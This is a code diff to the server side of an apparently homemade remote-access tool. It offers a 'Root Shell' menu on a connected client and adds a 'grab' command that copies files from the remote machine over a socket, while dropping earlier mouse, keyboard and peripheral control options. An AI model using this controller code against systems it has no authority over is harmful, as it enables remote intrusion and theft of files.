@@ -29,7 +29,7 @@ class Server:
                 #starting main shell loop. only shell commands right now will come to add more advanced preset scripts and such.
                 print("Connected to Client. Initiating Main Menu....")
                 while True:
-                    Choice = input("Select number from the Following Options:\n1) Root Shell\n2) Open Peripherals\n3) Control M&K\n4) Exit\n> ")
+                    Choice = input("Select number from the Following Options:\n1) Root Shell\n2) Exit\n> ")
                     #basic shell loop
                     if Choice == "1":
                         while True:
@@ -42,7 +42,19 @@ class Server:
                                 break
                             #takes form of "grab <local save location> <target location on remote>" use quotes to preserve literal path
                             elif servComArr[0] == "grab":
-                                print()
+                                try:
+                                    servComArr[1] = servComArr[1].replace("\\\\", "\\").replace('"', '')  # shlex was adding characters in an annoying way
+                                    servComArr[2] = servComArr[2].replace("\\\\", "\\").replace('"', '')
+                                    conn.sendall(f'grab "{servComArr[2]}"'.encode())
+                                    filebytes = conn.recv(BYTEBUFFER).decode() #client will respond with files bytes first
+                                    print(f"copying {filebytes} bytes of data. Please be patient no status will be shown...")
+                                    conn.sendall(b"start")
+                                    with open(servComArr[1], 'wb') as outfile:
+                                        outfile.write(conn.recv(int(filebytes), socket.MSG_WAITALL))#not going to use tqdm as it has render issues will just have to be patient on download
+                                        outfile.close()
+                                    print(f"File download completed located at: {servComArr[1]}")
+                                except Exception as e:
+                                    print(e.with_traceback())
                             #takes form of "upload <local file location> <target location on remote>" use quotes to preserve literal path
                             elif servComArr[0] == "upload":
                                 try:
